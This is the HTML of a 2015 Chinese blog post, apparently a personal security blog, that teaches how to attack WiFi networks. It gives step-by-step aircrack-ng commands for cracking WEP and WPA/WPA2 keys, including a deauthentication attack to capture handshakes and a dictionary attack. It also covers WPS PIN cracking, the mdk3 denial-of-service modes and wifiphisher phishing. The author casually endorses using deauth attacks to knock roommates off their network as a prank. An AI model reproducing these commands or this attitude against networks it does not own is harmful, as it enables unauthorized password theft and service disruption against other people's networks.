@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>攻击无线WiFi | xkon&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="##0x00 前戏
+写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^
+##0x01 WiFi受攻击面
+错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击无线WiFi">
+<meta property="og:url" content="http://xkon.githb.io/2015/04/15/攻击无线WiFi/index.html">
+<meta property="og:site_name" content="xkon's Blog">
+<meta property="og:description" content="##0x00 前戏
+写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^
+##0x01 WiFi受攻击面
+错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mi">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/airmon_start.png">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/ariodump1.png">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/airodump2.png">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/aireplay.PNG">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/aircrack.png">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/screenshot_wps.png">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/wifiphish.jpg">
+<meta property="og:image" content="http://7xi3ed.com1.z0.glb.clouddn.com/Tuscany, Italy.jpg">
+<meta property="og:updated_time" content="2015-10-14T03:53:01.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻击无线WiFi">
+<meta name="twitter:description" content="##0x00 前戏
+写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^
+##0x01 WiFi受攻击面
+错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mi">
+  
+    <link rel="alternative" href="/atom.xml" title="xkon&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xkon&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://xkon.githb.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-攻击无线WiFi" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/04/15/攻击无线WiFi/" class="article-date">
+  <time datetime="2015-04-15T09:34:53.000Z" itemprop="datePublished">2015-04-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻击无线WiFi
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##0x00 前戏</p>
+<p>写这篇WiFi攻击的起因其实是自己要做一个小恶作剧。小伙伴们在大中午用无线局域网玩联机游戏，而我又觉得太吵想睡觉，跟他们说又觉得不好意思，所以就用mdk3帮我解决了一下这个小麻烦。然后我又想结合以前所学，整理出了这篇文章。*_^</p>
+<p>##0x01 WiFi受攻击面</p>
+<p>错误的配置和弱加密,导致了密码被暴力破解的可能，也给了实施DoS攻击的可能。还有邪恶的WiFi钓鱼，网银密码窃取，mitm中间人攻击等等。下面将简单讲解一些攻击方法，包括密码破解，DOS攻击。其中中间人攻击将在其他文章中讲到。WiFi钓鱼不会细讲。</p>
+<a id="more"></a>
+<p>##0x02 WiFi密码破解</p>
+<h3 id="WEP加密的WiFi">WEP加密的WiFi</h3><p>WEP（Wired Equivalent Privacy）加密方式现在基本绝迹了，因为这种加密方式存在缺陷，使得黑客可以在几分钟甚至几秒钟内攻破它。这里只是简单记录一下步骤，不会详细展开。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. airmon-ng start wlan0                         <span class="comment">//开启wlan0网卡的监听模式</span></span><br><span class="line">2. airodump-ng mon0                              <span class="comment">//查看无线网络的情况，选择</span></span><br><span class="line">3. airodump-ng --ivs -w wep_test -c 6 mon0       <span class="comment">//捕获信道6的ivs数据报文，并保存到wep_test文件中</span></span><br><span class="line">4. aireplay-ng --arpreplay -b &lt;<span class="keyword">AP</span>'s bssid&gt; -<span class="keyword">h</span> &lt;客户端的<span class="keyword">mac</span>&gt; mon0</span><br><span class="line">5. aircrack-ng wep_test*                            <span class="comment">//ivs值到2w以上，一般就可以成功破解出来了</span></span><br></pre></td></tr></table></figure>
+<h3 id="WPA/WPA2_加密的WiFi">WPA/WPA2 加密的WiFi</h3><p><strong>方法一</strong><br>抓到握手包，然后跑字典得到密码</p>
+<p>主要有五个步骤，其中最后一步字典攻击，需要有强大的字典，获取需要一些社工，获取一些特定的信息来构造字典将会更有效。如下：</p>
+<ul>
+<li>进入监听模式<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/airmon_start.png" alt=""></p>
+<ul>
+<li>查看当前WiFi空间信息<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng mon0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/ariodump1.png" alt=""><br>这里我们选择ESSID为<code>Hi</code>的WiFi信号作为我们的测试对象，其中所用信道为11</p>
+<ul>
+<li>获取单个AP单个信道的流量<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid AP's_bssid -c <span class="number">11</span> --write filename mon0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/airodump2.png" alt=""></p>
+<ul>
+<li>Deauth 攻击获取握手包<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">5</span> <span class="operator">-a</span> AP<span class="string">'s_mac -c client'</span>s_mac  mon0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/aireplay.PNG" alt=""></p>
+<p><code>-0</code>表示进行deauth攻击，<code>5</code>为攻击次数</p>
+<ul>
+<li>字典破解得到密码<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w word.lst file.cap</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/aircrack.png" alt=""><br>成功得到密码</p>
+<p><strong>方法二</strong><br>利用WPS（Wi-Fi Protected Setup）的<a href="http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf" target="_blank" rel="external">缺陷</a>，抓pin码破解<br>工具：<a href="https://code.google.com/p/reaver-wps/" target="_blank" rel="external">reaver</a></p>
+<h3 id="简单易用的wifite">简单易用的<code>wifite</code></h3><p><a href="https://github.com/derv82/wifite" target="_blank" rel="external">wifite</a>是一个自动化的无线破解工具，他让前面的步骤自动化的执行，而不需要你去记一些命令。给它足够的时间，甚至可以破解全部可被搜索到的WiFi接入点密码……</p>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/screenshot_wps.png" alt="网上找的图"></p>
+<p>##0x03 对WiFi的拒绝服务攻击</p>
+<blockquote>
+<p>mdk3能够发起 Beacon Flood、Authentication DoS、Deauthentication/Disassociation Amok 等模式的攻击，另外它还具有针对隐藏 ESSID 的暴力探测模式、802.1X 渗透测试、WIDS 干扰等功能。</p>
+</blockquote>
+<p>mdk3已经内置在了Kali中，终端中输入mdk3即可查看用法</p>
+<blockquote>
+<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options]</span><br><span class="line"></span><br><span class="line">TEST MODES:</span><br><span class="line">b   - Beacon Flood <span class="built_in">Mode</span></span><br><span class="line">      Sends beacon frames to show fake APs <span class="built_in">at</span> clients.</span><br><span class="line">      This can sometimes crash network scanners and even drivers!</span><br><span class="line">a   - Authentication DoS <span class="built_in">mode</span></span><br><span class="line">      Sends authentication frames to all APs found <span class="flow">in</span> range.</span><br><span class="line">      Too much clients freeze or reset some APs.</span><br><span class="line">p   - Basic probing and ESSID Bruteforce <span class="built_in">mode</span></span><br><span class="line">      Probes AP and check <span class="flow">for</span> answer, useful <span class="flow">for</span> checking <span class="flow">if</span> SSID has</span><br><span class="line">      been correctly decloaked or <span class="flow">if</span> AP is <span class="flow">in</span> your adaptors sending range</span><br><span class="line">      SSID Bruteforcing is also possible with this test <span class="built_in">mode</span>.</span><br><span class="line">d   - Deauthentication / Disassociation Amok <span class="built_in">Mode</span></span><br><span class="line">      Kicks everybody found from AP</span><br><span class="line">m   - Michael shutdown exploitation (TKIP)</span><br><span class="line">      Cancels all traffic continuously</span><br><span class="line">x   - <span class="number">802</span>.<span class="number">1</span>X tests</span><br><span class="line">w   - WIDS/WIPS Confusion</span><br><span class="line">      Confuse/Abuse Intrusion Detection and Prevention Systems</span><br><span class="line">f   - MAC filter bruteforce <span class="built_in">mode</span></span><br><span class="line">      This test uses a list of known client MAC Adresses and tries to</span><br><span class="line">      authenticate them to the given AP while dynamically changing</span><br><span class="line">      its response timeout <span class="flow">for</span> best performance. It currently works only</span><br><span class="line">      on APs who deny an open authentication request properly</span><br><span class="line">g   - WPA Downgrade test</span><br><span class="line">      deauthenticates Stations and APs sending WPA encrypted packets.</span><br><span class="line">      With this test you can check <span class="flow">if</span> the sysadmin will try setting his</span><br><span class="line">      network to WEP or disable encryption.</span><br></pre></td></tr></table></figure>
+<p>关于mdk3的使用网上已经有了太多的教程，而且说得比较详细<br>可以参考<a href="http://files.cnblogs.com/files/noevil/Mdk3.pdf" target="_blank" rel="external">MDK3—无线拒绝服务攻击的开始</a>。<br>这里只说一个小trick，当小伙伴们用无线局域网玩游戏的时候，而你又觉得太吵，跟他们说又不好意思的话，这个mdk3能帮助你解决一些小麻烦，但是不要玩过火哦……</p>
+<p>一般<code>Authentication DoS mode</code>会玩过火，<code>Deauthentication</code>可以做的比较好，让他们不时发出一声<code>O，我掉线了</code>，<code>O 我卡了</code>，然后他们玩的不爽了，过一会就会不玩的……</p>
+<p>##0x04 WiFi钓鱼</p>
+<p>今年的央视“3·15”晚会曝光了黑客在公共场所利用“钓鱼WiFi”窃取用户隐私信息一事，又引起了大众对钓鱼WiFi的关注。</p>
+<p>乌云上也有一篇<a href="http://drops.wooyun.org/tips/112" target="_blank" rel="external">公共无线安全——FakeAP之WiFi钓鱼</a></p>
+<p>在github上也有人放出了一款WiFi钓鱼软件<a href="https://github.com/sophron/wifiphisher" target="_blank" rel="external">wifiphisher</a>，作者自称这是一款社工工具，原理就是攻击者建立一个假冒的AP，然后用deauth攻击，让客户端离线，接着让客户端连上自己的假冒的AP，最后给一个逼真的路由配置界面，让客户输入密码，从而得到密码。<br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/wifiphish.jpg" alt=""></p>
+<p>这么邪恶的WiFi钓鱼，我可没有做过……</p>
+<p>##0x05 参考</p>
+<ul>
+<li><a href="http://www.cse.wustl.edu/~jain/cse571-07/ftp/wireless_hacking/" target="_blank" rel="external">Wireless Hacking Tools</a></li>
+</ul>
+<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/Tuscany, Italy.jpg" alt="世界美景"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://xkon.githb.io/2015/04/15/攻击无线WiFi/" data-id="cifqa365p000c1lmd5c93kgft" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wifi/">wifi</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/04/17/内网渗透小tricks/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          内网渗透小tricks
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/04/06/识别简单的验证码/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">识别简单的验证码</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/JMXInvokerServlet/">JMXInvokerServlet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse-Shell/">Reverse Shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jboss/">jboss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mitm/">mitm</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sniff/">sniff</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tmux/">tmux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wifi/">wifi</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网/">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/常见漏洞/">常见漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/扫描/">扫描</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/端口与服务/">端口与服务</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/验证码/">验证码</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/JMXInvokerServlet/" style="font-size: 10px;">JMXInvokerServlet</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Reverse-Shell/" style="font-size: 10px;">Reverse Shell</a> <a href="/tags/jboss/" style="font-size: 10px;">jboss</a> <a href="/tags/mitm/" style="font-size: 10px;">mitm</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sniff/" style="font-size: 10px;">sniff</a> <a href="/tags/tmux/" style="font-size: 10px;">tmux</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/内网/" style="font-size: 10px;">内网</a> <a href="/tags/常见漏洞/" style="font-size: 10px;">常见漏洞</a> <a href="/tags/扫描/" style="font-size: 10px;">扫描</a> <a href="/tags/端口与服务/" style="font-size: 10px;">端口与服务</a> <a href="/tags/验证码/" style="font-size: 10px;">验证码</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">五月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">四月 2015</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2015/09/15/常见端口服务及常见漏洞/">常见端口服务及对应漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2015/09/10/Jboss-JMXInvokerServlet探测脚本/">多线程批量Jboss_JMXInvokerServlet探测脚本</a>
+          </li>
+        
+          <li>
+            <a href="/2015/09/04/Linux建立反向shell的几种方式/">Linux建立反向shell的几种方式</a>
+          </li>
+        
+          <li>
+            <a href="/2015/07/04/PHP多版本切换/">PHP多版本切换</a>
+          </li>
+        
+          <li>
+            <a href="/2015/07/02/php配置/">PHP的一些配置可能导致的安全隐患</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2015 xkon<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+  </div>
+</body>
+</html>
